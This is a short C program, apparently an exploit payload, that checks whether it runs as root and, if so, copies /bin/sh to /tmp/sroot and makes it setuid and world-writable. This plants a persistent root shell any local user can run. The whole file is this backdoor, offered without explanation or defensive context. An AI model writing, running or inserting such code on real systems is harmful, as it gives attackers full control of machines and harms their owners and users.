#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char const* argv[])
{
    if (getuid()==0 || getuid()==0)        {
        system("cp /bin/sh /tmp/sroot");
        system("chmod 4777 /tmp/sroot");  }
        sync();
        return 0;
}
